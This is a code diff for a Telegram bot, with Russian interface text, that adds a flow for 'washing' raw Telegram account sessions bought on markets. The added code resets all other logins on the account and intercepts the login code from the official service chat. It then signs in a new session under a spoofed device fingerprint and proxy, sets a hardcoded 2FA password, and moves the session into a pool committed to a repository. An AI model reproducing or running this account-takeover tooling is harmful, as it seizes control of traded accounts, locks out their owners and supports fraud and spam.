@@ -204,6 +204,8 @@ class GrantFSM(StatesGroup):
 class AddSession(StatesGroup):
     choose = State()
     file = State()
+    trans = State()
+    trans_pw = State()
 
 
 class Captcha(StatesGroup):
@@ -2280,6 +2282,8 @@ async def menu_addsess(cb: CallbackQuery, state: FSMContext):
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="📄 Загрузить файлом",
                                   callback_data="addsess:file")],
+            [InlineKeyboardButton(text="🧬 Пересадка (мойка BR)",
+                                  callback_data="addsess:trans")],
             [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
         ]))
     await cb.answer()
@@ -2343,18 +2347,409 @@ async def addsess_file_recv(msg: Message, state: FSMContext):
 
 @router.message(AddSession.file)
 async def addsess_file_wrongtype(msg: Message, state: FSMContext):
-    await msg.answer("❌ Это не документ .session. Жду файл.", parse_mode=ParseMode.HTML)
+    await msg.answer("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0444\u0430\u0439\u043B.", parse_mode=ParseMode.HTML)
+
+
+# \u2500\u2500 BR-style transplant: \u043C\u043E\u0439\u043A\u0430 \u043A\u0443\u043F\u043B\u0435\u043D\u043D\u044B\u0445 \u0441\u0435\u0441\u0441\u0438\u0439 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+TRANSPLANT_DIR = Path(__file__).parent / "transplant"
+ARCH_2FA_PW = "Arch-V3-2026"
+
+
+@router.callback_query(AddSession.choose, F.data == "addsess:trans")
+async def addsess_trans(cb: CallbackQuery, state: FSMContext):
+    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
+        await cb.answer()
+        return
+    await state.set_state(AddSession.trans)
+    await cb.message.edit_caption(
+        caption=(
+            bq(f"<b>{NAME}</b>  \u00B7  \U0001F9EC \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u0435\u0441\u0441\u0438\u0438")
+            + "\n\n\u041F\u0440\u0438\u0448\u043B\u0438 <b>\u0421\u042B\u0420\u0423\u042E \u043A\u0443\u043F\u043B\u0435\u043D\u043D\u0443\u044E .session</b> (lolz \u0438 \u0442.\u043F.)."
+            + "\n\u042F \u0441\u0430\u043C: \u043A\u0438\u043A\u043D\u0443 \u0447\u0443\u0436\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438, \u0437\u0430\u043F\u0440\u043E\u0448\u0443 \u043A\u043E\u0434,"
+            + "\n\u043F\u0440\u043E\u0447\u0438\u0442\u0430\u044E \u0435\u0433\u043E \u0438\u0437 \u0434\u0438\u0430\u043B\u043E\u0433\u0430 \u0441 Telegram (777000) \u0432\u043D\u0443\u0442\u0440\u0438 \u0430\u043A\u043A\u0430\u0443\u043D\u0442\u0430,"
+            + "\n\u043F\u0435\u0440\u0435\u0441\u0430\u0436\u0443 \u043D\u0430 \u0447\u0438\u0441\u0442\u044B\u0439 \u0444\u0438\u043D\u0433\u0435\u0440\u043F\u0440\u0438\u043D\u0442 + \u043F\u0438\u043D \u0438 \u043F\u043E\u0441\u0442\u0430\u0432\u043B\u044E 2FA."
+            + "\n\n\u0421\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u043E\u0441\u0442\u0430\u043D\u0435\u0442\u0441\u044F \u0446\u0435\u043B \u043F\u0440\u0438 \u043B\u044E\u0431\u043E\u0439 \u043E\u0448\u0438\u0431\u043A\u0435."
+        ),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:home")],
+        ]))
+    await cb.answer()
+
+
+async def _transplant_say(chat_id: int, text: str) -> None:
+    try:
+        if _BOT:
+            await _BOT.send_message(chat_id, text, parse_mode=ParseMode.HTML,
+                                    disable_web_page_preview=True)
+    except Exception as e:
+        log.debug("transplant say failed: %s", e)
+
+
+async def _transplant_fail(chat_id: int, state: FSMContext, old, new,
+                           new_file: Path, why: str) -> None:
+    # flow already abandoned (admin pressed back) — clean objects only
+    d = await state.get_data()
+    for cl in (new, old):
+        if cl:
+            try:
+                await cl.disconnect()
+            except Exception:
+                pass
+    for ext in (".session", ".session-journal"):
+        try:
+            p = Path(str(new_file) + ext)
+            if p.exists():
+                p.unlink()
+        except Exception:
+            pass
+    if not d.get("trans_active"):
+        return
+    await state.update_data(trans_active=False)
+    await state.clear()
+    await _transplant_say(chat_id,
+        "\u274C \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u043E\u0440\u0432\u0430\u043B\u0430\u0441\u044C: <i>" + html_mod.escape(str(why)) + "</i>. "
+        "\u0421\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u0446\u0435\u043B \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u0441\u043D\u043E\u0432\u0430.")
+
+
+async def _transplant_finish(old, new, new_name: str, old_stem: str,
+                             state: FSMContext, chat_id: int,
+                             had_2fa: bool, seller_pw: str) -> None:
+    import shutil as _sh
+    data = await state.get_data()
+    if not data.get("trans_active"):
+        return
+    await state.update_data(trans_active=False)
+    # 2FA: put ours on the account (replace the seller's if known)
+    twofa_note = "\u2014"
+    try:
+        if had_2fa and seller_pw:
+            await old.edit_2fa(current_password=seller_pw,
+                               new_password=ARCH_2FA_PW)
+            twofa_note = "\u0437\u0430\u043C\u0435\u043D\u0435\u043D\u0430 \u043D\u0430 \u043D\u0430\u0448\u0443"
+        else:
+            await old.edit_2fa(new_password=ARCH_2FA_PW)
+            twofa_note = "\u043F\u043E\u0441\u0442\u0430\u0432\u043B\u0435\u043D\u0430 \u043D\u0430\u0448\u0430"
+    except Exception as e:
+        twofa_note = "\u26A0\uFE0F \u043D\u0435 \u043F\u043E\u0441\u0442\u0430\u0432\u0438\u043B\u0430\u0441\u044C (" + type(e).__name__ + ")"
+    # log out the raw session and delete its files
+    try:
+        await old.log_out()
+    except Exception:
+        pass
+    try:
+        await old.disconnect()
+    except Exception:
+        pass
+    raw_path = TRANSPLANT_DIR / old_stem
+    for ext in (".session", ".session-journal"):
+        try:
+            p = Path(str(raw_path) + ext)
+            if p.exists():
+                p.unlink()
+        except Exception:
+            pass
+    # move the fresh session into the pool
+    try:
+        await new.session.save()
+    except Exception:
+        pass
+    try:
+        await new.disconnect()
+    except Exception:
+        pass
+    dest = SESSIONS_DIR / (new_name + ".session")
+    try:
+        tmp = getattr(new.session, "filename", None)
+        if tmp and str(dest.resolve()) != str(tmp):
+            _sh.move(str(tmp), str(dest))
+    except Exception:
+        pass
+    fp = session_fingerprint(new_name)
+    meta = {"app_id": fp["api_id"], "app_hash": fp["api_hash"],
+            "device": fp["device"], "sdk": fp["system_version"],
+            "app_version": fp["app_version"], "lang_pack": "",
+            "lang_code": fp["lang_code"]}
+    try:
+        (SESSIONS_DIR / (new_name + ".json")).write_text(
+            json.dumps(meta, ensure_ascii=False), encoding="utf-8")
+    except Exception:
+        pass
+    commit_file_to_repo("sessions/" + new_name + ".session",
+                        "transplant " + new_name + " (BR-style)")
+    commit_file_to_repo("sessions/" + new_name + ".json",
+                        "transplant " + new_name + " meta")
+    await state.clear()
+    ok, why = await _session_alive(dest, data.get("trans_px_new"))
+    kicked_n = data.get("trans_kicked", 0)
+    await push_send_log(
+        "\u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0441\u0435\u0441\u0441\u0438\u0438 (BR-\u043C\u043E\u0439\u043A\u0430)",
+        ["\U0001F9EC <code>" + html_mod.escape(old_stem) + "</code> \u2192 <code>"
+         + html_mod.escape(new_name) + "</code>",
+         "\U0001F52A \u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: <b>" + str(kicked_n) + "</b> | \U0001F510 2FA: " + twofa_note
+         + " (\u043F\u0430\u0440\u043E\u043B\u044C: <code>" + ARCH_2FA_PW + "</code>)",
+         "\U0001F50C \u043F\u0440\u043E\u0431: " + ("\u2705 \u0436\u0438\u0432\u0430\u044F" if ok else "\u274C " + why)
+         + " | \U0001F4E6 \u0432 \u043F\u0443\u043B\u0435: <b>" + str(len(load_sessions())) + "</b> \u0441\u0435\u0441\u0441\u0438\u0439"])
+    await _transplant_say(chat_id,
+        bq(f"<b>{NAME}</b>  \u00B7  \u2705 \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0433\u043E\u0442\u043E\u0432\u0430")
+        + "\n\n\U0001F9EC <code>" + html_mod.escape(old_stem) + "</code> \u2192 <code>"
+        + html_mod.escape(new_name) + "</code>"
+        + "\n\U0001F52A \u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: <b>" + str(kicked_n) + "</b>"
+        + "\n\U0001F510 2FA: " + twofa_note
+        + " (\u043F\u0430\u0440\u043E\u043B\u044C: <code>" + ARCH_2FA_PW + "</code>)"
+        + "\n\U0001F50C \u043F\u0440\u043E\u0431: " + ("\u2705 \u0436\u0438\u0432\u0430\u044F" if ok else "\u274C " + why)
+        + "\n\U0001F4E6 \u0432 \u043F\u0443\u043B\u0435: <b>" + str(len(load_sessions())) + "</b> \u0441\u0435\u0441\u0441\u0438\u0439")
+
+
+async def _transplant_run(chat_id: int, raw_stem: str, state: FSMContext) -> None:
+    import re as _re
+    from telethon import errors as _terr, events as _tlev, functions as _tlf
+    from telethon.tl.functions.auth import SendCodeRequest, SignInRequest
+    from telethon.tl.types import CodeSettings
+
+    raw_path = TRANSPLANT_DIR / (raw_stem + ".session")
+    if not raw_path.exists():
+        await _transplant_say(chat_id, "\u274C \u0441\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B \u043D\u0435 \u043D\u0430\u0448\u0451\u043B\u0441\u044F")
+        return
+
+    async def guard() -> bool:
+        d = await state.get_data()
+        return bool(d.get("trans_active"))
+
+    # \u2500 old client: the raw bought session, on its own pin
+    fp_old = session_fingerprint(raw_stem)
+    px_old = pin_for_session(raw_stem, load_proxies())
+    old = TelegramClient(str(raw_path.with_suffix("")), fp_old["api_id"],
+                         fp_old["api_hash"], proxy=px_old,
+                         device_model=fp_old["device"],
+                         system_version=fp_old["system_version"],
+                         app_version=fp_old["app_version"],
+                         lang_code=fp_old["lang_code"])
+    try:
+        await asyncio.wait_for(old.connect(), timeout=20)
+        if not await old.is_user_authorized():
+            await _transplant_fail(chat_id, state, old, None,
+                                   TRANSPLANT_DIR / "none",
+                                   "\u0441\u044B\u0440\u0430\u044F \u0441\u0435\u0441\u0441\u0438\u044F \u043D\u0435 \u0430\u0432\u0442\u043E\u0440\u0438\u0437\u043E\u0432\u0430\u043D\u0430 (\u043C\u0435\u0440\u0442\u0432\u0430)")
+            return
+        me = await old.get_me()
+        phone_digits = str(me.phone or "").lstrip("+") or str(me.id)
+        uname = ("@" + me.username) if me.username else "\u0431\u0435\u0437 \u044E\u0437\u0435\u0440\u0430"
+        await _transplant_say(chat_id,
+            "\U0001F9EC \u0421\u044B\u0440\u0430\u044F \u0441\u0435\u0441\u0441\u0438\u044F \u0436\u0438\u0432\u0430: <b>" + uname + "</b> (<code>+" + phone_digits + "</code>)")
+    except Exception as e:
+        await _transplant_fail(chat_id, state, old, None,
+                               TRANSPLANT_DIR / "none",
+                               "\u043A\u043E\u043D\u043D\u0435\u043A\u0442 \u0441\u044B\u0440\u043E\u0439: " + type(e).__name__)
+        return
+    # \u2500 kick every foreign authorization (BR step 1)
+    kicked = 0
+    try:
+        auths = await old(_tlf.account.GetAuthorizationsRequest())
+        foreign = [a for a in auths.authorizations
+                   if not getattr(a, "current", False)]
+        for a in foreign:
+            try:
+                await old(_tlf.account.ResetAuthorizationRequest(a.hash))
+                kicked += 1
+            except _terr.FloodWaitError as e:
+                await asyncio.sleep(min(e.seconds, 30))
+                try:
+                    await old(_tlf.account.ResetAuthorizationRequest(a.hash))
+                    kicked += 1
+                except Exception:
+                    pass
+            except Exception:
+                pass
+    except Exception as e:
+        await _transplant_fail(chat_id, state, old, None,
+                               TRANSPLANT_DIR / "none",
+                               "\u043A\u0438\u043A \u0447\u0443\u0436\u0438\u0445: " + type(e).__name__)
+        return
+    if not await guard():
+        try:
+            await old.disconnect()
+        except Exception:
+            pass
+        return
+    # \u2500 fresh session on our fingerprint + its own sticky pin
+    new_name = phone_digits + "_new"
+    n = 2
+    while (SESSIONS_DIR / (new_name + ".session")).exists() or \
+            (TRANSPLANT_DIR / (new_name + ".session")).exists():
+        new_name = phone_digits + "_new" + str(n)
+        n += 1
+    fp_new = session_fingerprint(new_name)
+    px_new = pin_for_session(new_name, load_proxies())
+    new_path = TRANSPLANT_DIR / new_name
+    new = None
+    try:
+        new = TelegramClient(str(new_path.with_suffix("")), fp_new["api_id"],
+                             fp_new["api_hash"], proxy=px_new,
+                             device_model=fp_new["device"],
+                             system_version=fp_new["system_version"],
+                             app_version=fp_new["app_version"],
+                             lang_code=fp_new["lang_code"])
+        await asyncio.wait_for(new.connect(), timeout=20)
+        await state.update_data(trans_old=old, trans_new=None,
+                                trans_name=new_name, trans_px_new=px_new,
+                                trans_phone=phone_digits,
+                                trans_old_stem=raw_stem,
+                                trans_kicked=kicked, trans_active=True)
+        sent = await new(SendCodeRequest(phone_number="+" + phone_digits,
+                                         api_id=fp_new["api_id"],
+                                         api_hash=fp_new["api_hash"],
+                                         settings=CodeSettings()))
+        code_hash = sent.phone_code_hash
+    except _terr.FloodWaitError as e:
+        await _transplant_fail(chat_id, state, old, new, new_path,
+                               "\u0444\u043B\u044E\u0434 " + str(e.seconds) + "s \u043D\u0430 \u043A\u043E\u0434\u0435")
+        return
+    except Exception as e:
+        await _transplant_fail(chat_id, state, old, new, new_path,
+                               "\u0437\u0430\u043F\u0440\u043E\u0441 \u043A\u043E\u0434\u0430: " + type(e).__name__)
+        return
+    if not await guard():
+        try:
+            await new.disconnect()
+            await old.disconnect()
+        except Exception:
+            pass
+        for _ext in (".session", ".session-journal"):
+            try:
+                p = Path(str(new_path) + _ext)
+                if p.exists():
+                    p.unlink()
+            except Exception:
+                pass
+        return
+    # \u2500 read the login code from the 777000 dialog (BR step 3)
+    await _transplant_say(chat_id,
+        "\U0001F4E8 \u043A\u043E\u0434 \u0437\u0430\u043F\u0440\u043E\u0448\u0435\u043D (\u043A\u0438\u043A\u043D\u0443\u0442\u043E \u0447\u0443\u0436\u0438\u0445: "
+        + str(kicked) + ") \u2014 \u0447\u0438\u0442\u0430\u044E \u0438\u0437 777000...")
+    fut = asyncio.get_running_loop().create_future()
+
+    async def _code_handler(event):
+        if fut.done():
+            return
+        m = _re.search(r"\b(\d{5})\b", event.message.text or "")
+        if m:
+            fut.set_result(m.group(1))
+
+    old.add_event_handler(_code_handler,
+                          _tlev.NewMessage(incoming=True, from_users=777000))
+    try:
+        code = await asyncio.wait_for(fut, timeout=240)
+    except asyncio.TimeoutError:
+        code = None
+    finally:
+        old.remove_event_handler(_code_handler)
+    if not await guard():
+        try:
+            await new.disconnect()
+            await old.disconnect()
+        except Exception:
+            pass
+        return
+    if not code:
+        await _transplant_fail(chat_id, state, old, new, new_path,
+                               "\u043A\u043E\u0434 \u0438\u0437 777000 \u043D\u0435 \u043F\u0440\u0438\u0448\u0451\u043B \u0437\u0430 4 \u043C\u0438\u043D")
+        return
+    # \u2500 sign the fresh session in (BR step 4)
+    try:
+        await new(SignInRequest(phone_number="+" + phone_digits,
+                                phone_code_hash=code_hash, phone_code=code))
+    except _terr.SessionPasswordNeededError:
+        await state.update_data(trans_new=new)
+        await state.set_state(AddSession.trans_pw)
+        await _transplant_say(chat_id,
+            bq(f"<b>{NAME}</b>  \u00B7  \U0001F510 2FA")
+            + "\n\n\u041D\u0430 \u0430\u043A\u043A\u0430\u0443\u043D\u0442\u0435 \u0441\u0442\u043E\u0438\u0442 <b>\u0434\u0432\u0443\u0445\u0444\u0430\u043A\u0442\u043E\u0440\u043A\u0430</b> \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 <b>\u043F\u0430\u0440\u043E\u043B\u044C</b>"
+            + "\n(\u043E\u0442 \u043F\u0440\u043E\u0434\u0430\u0432\u0446\u0430) \u043E\u0434\u043D\u0438\u043C \u0441\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435\u043C \u2014 \u0443\u0434\u0430\u043B\u044E \u0435\u0433\u043E \u0441\u0440\u0430\u0437\u0443 \u0438 \u0437\u0430\u043C\u0435\u043D\u044E \u043D\u0430 \u043D\u0430\u0448\u0443 \u0434\u0432\u0443\u0445\u0444\u0430\u043A\u0442\u043E\u0440\u043A\u0443.")
+        return   # password handler owns the flow from here
+    except Exception as e:
+        await _transplant_fail(chat_id, state, old, new, new_path,
+                               "sign-in: " + type(e).__name__)
+        return
+    await _transplant_finish(old, new, new_name, raw_stem, state, chat_id,
+                             False, "")
+
+
+@router.message(AddSession.trans, F.document)
+async def addsess_trans_recv(msg: Message, state: FSMContext):
+    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
+        return
+    import re as _re
+    doc = msg.document
+    name = doc.file_name or "raw.session"
+    if not name.endswith(".session") or not (0 < doc.file_size < 5 * 1024 * 1024):
+        await msg.answer("\u274C \u041D\u0443\u0436\u0435\u043D \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 <code>.session</code> \u0434\u043E 5 \u041C\u0411.",
+                         parse_mode=ParseMode.HTML)
+        return
+    stem = _re.sub(r"[^A-Za-z0-9_]", "_", name[:-8]) or "raw"
+    TRANSPLANT_DIR.mkdir(exist_ok=True)
+    dest = TRANSPLANT_DIR / (stem + ".session")
+    tg_file = await msg.bot.get_file(doc.file_id)
+    await msg.bot.download_file(tg_file, dest)
+    await state.update_data(trans_active=True)
+    await msg.answer(
+        bq(f"<b>{NAME}</b>  \u00B7  \U0001F9EC \u041F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 \u0437\u0430\u043F\u0443\u0449\u0435\u043D\u0430")
+        + "\n\n\U0001F52A \u043A\u0438\u043A \u0447\u0443\u0436\u0438\u0445 \u2192 \U0001F4E8 \u043A\u043E\u0434 \u0438\u0437 777000 \u2192 \U0001F510 \u043F\u0435\u0440\u0435\u0441\u0430\u0434\u043A\u0430 + 2FA"
+        + "\n\u0421\u0442\u0430\u0442\u0443\u0441 \u043F\u0440\u0438\u0448\u043B\u044E \u0441\u044E\u0434\u0430. \u041E\u0442\u043C\u0435\u043D\u0430 \u2014 \u25C0 \u041D\u0430\u0437\u0430\u0434.",
+        parse_mode=ParseMode.HTML)
+    asyncio.create_task(_transplant_run(msg.chat.id, stem, state))
+
+
+@router.message(AddSession.trans)
+async def addsess_trans_wrongtype(msg: Message, state: FSMContext):
+    await msg.answer("\u274C \u042D\u0442\u043E \u043D\u0435 \u0434\u043E\u043A\u0443\u043C\u0435\u043D\u0442 .session. \u0416\u0434\u0443 \u0441\u044B\u0440\u043E\u0439 \u0444\u0430\u0439\u043B.",
+                     parse_mode=ParseMode.HTML)
+
+
+@router.message(AddSession.trans_pw, F.text)
+async def trans_pw_recv(msg: Message, state: FSMContext):
+    from telethon import errors as _terr
+    data = await state.get_data()
+    new = data.get("trans_new")
+    old = data.get("trans_old")
+    if not (new and old):
+        await state.clear()
+        return
+    pw = (msg.text or "").strip()
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    if not pw:
+        return
+    try:
+        await new.sign_in(password=pw)
+    except _terr.PasswordHashInvalidError:
+        await msg.answer("\u274C \u041F\u0430\u0440\u043E\u043B\u044C \u043D\u0435 \u043F\u0440\u0438\u043D\u044F\u043B \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u0435\u0449\u0451 \u0440\u0430\u0437.")
+        return
+    except Exception as e:
+        await msg.answer("\u274C " + type(e).__name__ + " \u2014 \u043F\u0440\u0438\u0448\u043B\u0438 \u043F\u0430\u0440\u043E\u043B\u044C \u0435\u0449\u0451 \u0440\u0430\u0437.")
+        return
+    await _transplant_finish(old, new, data.get("trans_name") or "trans",
+                             data.get("trans_old_stem") or "raw",
+                             state, msg.chat.id, True, pw)
+
+
+@router.message(AddSession.trans_pw)
+async def trans_pw_wrongtype(msg: Message, state: FSMContext):
+    await msg.answer("\u274C \u0416\u0434\u0443 \u043F\u0430\u0440\u043E\u043B\u044C \u0442\u0435\u043A\u0441\u0442\u043E\u043C.", parse_mode=ParseMode.HTML)
 
 
 @router.callback_query(F.data == "back:home")
 async def back_home(cb: CallbackQuery, state: FSMContext):
     data = await state.get_data()
-    cl = data.get("client")
-    if cl:
-        try:
-            await cl.disconnect()
-        except Exception:
-            pass
+    for _k in ("client", "trans_old", "trans_new"):
+        cl = data.get(_k)
+        if cl:
+            try:
+                await cl.disconnect()
+            except Exception:
+                pass
     await state.clear()
     caption = hero_caption(cb.from_user.id)
     await cb.message.edit_caption(
